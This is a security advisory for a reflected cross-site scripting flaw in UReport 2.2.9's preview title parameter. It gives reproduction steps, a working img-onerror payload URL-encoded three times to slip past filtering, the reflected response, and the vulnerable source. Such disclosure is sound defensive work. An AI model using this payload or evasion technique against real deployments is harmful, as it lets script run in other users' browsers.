# UReport preview title reflected XSS

## Summary

UReport decodes the preview _title parameter, or falls back to the decoded _u value, and emits it inside the HTML title element without context-appropriate encoding.

## Affected product

- Vendor/project: **youseries**
- Product: **UReport**
- Affected version: **2.2.9 (verified in SpringBlade 5.0.2)**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Authenticated attacker; victim opens the crafted preview URL.

Verified flow: `preview _title or fallback _u -> buildTitle()/decode() -> Velocity title -> <title>${title}</title>`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Create a title payload that closes the title element and adds an event-capable HTML marker.
2. URL-encode the value three times so filtering observes only the encoded form.
3. Request the preview with _title, or the fallback _u parameter, and inspect the returned head markup.

Sanitized request shape used during verification:

```http
GET <BASE_URL>/blade-report/ureport/preview
blade-auth: bearer <JWT>

?_u=<ANY>&_title=URLENCODEx3('</title><img src=x onerror=self[`al`+`ert`](`gt48261022t2c`)>')

# Fallback variant: place the triple-encoded value in _u and omit _title.
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `t2a / u1a` | raw IMG in title | **PASS** |
| 2 | `t2b / u1b` | raw IMG in title | **PASS** |
| 3 | `t2c / u1c` | raw IMG in title | **PASS** |

```text
Saved run-3 _title response:
<title></title><img src=x onerror=self[`al`+`ert`](`gt48261022t2c`)>-ureport</title>

The fallback _u response contains the equivalent gt48261022u1c marker.
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
HtmlPreviewServletAction.java:147-163
private String buildTitle(HttpServletRequest req) {
    String title = req.getParameter("_title");
    if (StringUtils.isNotBlank(title)) {
        title = decode(title);
    } else {
        title = decode(req.getParameter("_u"));
    }
    return title + "-ureport";
}

ureport-html/html-preview.html:10
<title>${title}</title>
```

Root cause: Decoded request data is treated as trusted document-title markup and Velocity performs no context-aware escaping.

## Recommended remediation

HTML-encode title text at the template boundary and remove repeated decoding of security-sensitive request parameters.

## References

- Official source: https://github.com/youseries/ureport/blob/master/ureport2-console/src/main/java/com/bstek/ureport/console/html/HtmlPreviewServletAction.java

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are compact reviewer captures rendered from saved raw HTTP/DOM/database evidence. They preserve the verified request, response/DOM evidence, and highlighted source-to-Sink path while redacting credentials and private deployment details.

### Sanitized reproduction

![CAN-01 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-01/01-reproduction-v2.png)

### Three-run success proof

![CAN-01 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-01/02-success-proof-v2.png)

### Source-to-Sink evidence

![CAN-01 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-01/03-source-sink-v2.png)
